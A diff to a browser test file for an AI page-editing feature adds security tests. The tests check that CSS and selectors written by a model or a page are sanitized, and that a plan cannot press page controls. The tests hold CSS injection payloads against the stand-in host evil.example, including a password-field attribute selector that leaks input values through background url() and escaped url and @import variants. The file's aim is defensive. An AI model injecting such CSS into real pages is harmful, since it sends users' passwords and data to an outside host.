@@ -7,7 +7,7 @@
 // zaps, style changes as one CSS-only Boost per sentence, anything needing
 // script is done once and never kept, and Esc is Just this time.
 
-const { WhimsyAIPageEdits, WhimsyPageBar, sanitizeCSS } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyAIPageEdits.sys.mjs");
+const { WhimsyAIPageEdits, WhimsyPageBar, sanitizeCSS, safeSelector, rulesFromCSS, cleanRules, cssFromRules } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyAIPageEdits.sys.mjs");
 const { WhimsyAIProviders } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyAIProviders.sys.mjs");
 const { WhimsyZap } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyZap.sys.mjs");
 const { gZenBoostsManager } = ChromeUtils.importESModule("resource:///modules/zen/boosts/ZenBoostsManager.sys.mjs");
@@ -19,7 +19,7 @@ const PLANS = {
   "hide the sidebar": { hide: ["#sidebar"], css: "", click: [], done: "Hid the sidebar" },
   "make the text bigger": {
     hide: [],
-    css: "body { font-size: 22px; } body { background: url(https://evil.example/x.png) } @import url(https://evil.example/a.css);",
+    css: "body { font-size: 22px; } body { background: url(https://evil.example/x.png) } p { color: rgb(0 0 0 / 80%); behavior: x; }",
     click: [],
     done: "Made the text bigger",
   },
@@ -109,22 +109,60 @@ add_task(async function style_saves_css_only_boost() {
   closeToasts();
 });
 
-add_task(async function script_never_saved() {
+// W23 secfix M5: Change this page only hides, restyles, or reorders. A
+// plan that asks to press the page's controls presses nothing.
+add_task(async function never_presses_page_controls() {
   await BrowserTestUtils.withNewTab(PAGE, async browser => {
     const result = await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "expand every comment");
-    is(result.kind, "script", "Needs the page's code");
-    is(result.clicked, 2, "Only the disclosure controls were pressed, never links");
-    const open = await SpecialPowers.spawn(browser, [], () => [...content.document.querySelectorAll("details")].every(d => d.open));
-    ok(open, "Done for now");
-    const bar = await barShown();
-    ok(bar.querySelector("[data-button=keep]").disabled, "Keep isn't available");
-    is(bar.querySelector("small").getAttribute("data-l10n-id"), "whimsy-edit-script-why", "And says why");
-    ok(!WhimsyAIPageEdits.keep(window), "Keep refuses it");
-    EventUtils.synthesizeMouseAtCenter(bar.querySelector("[data-button=done]"), {});
-    await TestUtils.waitForCondition(() => !WhimsyPageBar.current(window), "Done closes the bar");
+    is(result.kind, "missing", "Nothing it may do here");
+    ok(!("clicked" in result), "and nothing was pressed");
+    const open = await SpecialPowers.spawn(browser, [], () => [...content.document.querySelectorAll("details")].some(d => d.open));
+    ok(!open, "Every comment is still collapsed");
+    await barShown();
+    WhimsyPageBar.hide(window);
     is(WhimsyAIPageEdits.edits(DOMAIN).boosts.length, 0, "No Boost");
     is(WhimsyZap.getZapSelectors(DOMAIN).length, 0, "No zap");
   });
+});
+
+// W23 secfix M1/M2: nothing a model or a page writes can make a kept rule
+// load a URL or start another rule.
+add_task(async function kept_rules_are_structured_and_safe() {
+  const injected = 'x{} input[name=password][value^=a]{background:url(https://evil.example/a)} y';
+  is(safeSelector(injected), null, "A selector that closes its rule is refused");
+  is(safeSelector("#a /* */ b"), null, "Comments are refused");
+  is(safeSelector("a[href^=http"), null, "A selector that doesn't parse is refused");
+  is(safeSelector(" #comments > li:nth-of-type(2) "), "#comments > li:nth-of-type(2)", "A plain one is kept");
+  for (const css of [
+    "body{background:\\75 rl(https://evil.example/p)}",
+    "body{background:u\\72l(https://evil.example/p)}",
+    "@\\69mport url(https://evil.example/a.css); body { color: red }",
+    "@import url(https://evil.example/a.css); body { color: red }",
+    "body { background-image: image-set('https://evil.example/p' 1x) }",
+    "body { color: red; } /* } body { background: url(x) } */",
+  ]) {
+    Assert.deepEqual(rulesFromCSS(css).filter(r => JSON.stringify(r).includes("evil")), [], `Nothing survives: ${css}`);
+    ok(!/url|image-set|evil|@|\\/i.test(sanitizeCSS(css)), `and no CSS comes of it: ${css}`);
+  }
+  Assert.deepEqual(rulesFromCSS("article { font-size: 19px; width: 50%; position: fixed; content: 'x' } .ad { display: block }"),
+    [{ selector: "article", props: { "font-size": "19px", width: "50%" } }],
+    "Only allowlisted properties; display only as none");
+  Assert.deepEqual(cleanRules([{ selector: "a", props: { color: "red", "background-image": "url(https://evil.example)" } }, { selector: "b{}", hide: true }]),
+    [{ selector: "a", props: { color: "red" } }], "Stored rules are checked again before use");
+  is(cssFromRules([{ selector: "#sidebar", hide: true }]), "#sidebar { display: none !important; }", "The CSS is generated from the rules");
+
+  // A plan whose hide list carries an injected selector keeps only what matched.
+  await BrowserTestUtils.withNewTab(PAGE, async () => {
+    PLANS["hide the sidebar and the bad bit"] = { hide: ["#sidebar", injected], css: "", done: "Hid it" };
+    const result = await WhimsyAIPageEdits.apply(window, gBrowser.selectedTab, "hide the sidebar and the bad bit");
+    Assert.deepEqual(result.hide, ["#sidebar"], "Only the selector that matched");
+    await barShown();
+    ok(WhimsyAIPageEdits.keep(window), "Kept");
+    Assert.deepEqual(WhimsyZap.getZapSelectors(DOMAIN), ["#sidebar"], "The injected selector never reaches the site's Boost");
+    delete PLANS["hide the sidebar and the bad bit"];
+  });
+  cleanBoosts();
+  closeToasts();
 });
 
 add_task(async function just_this_time_esc() {
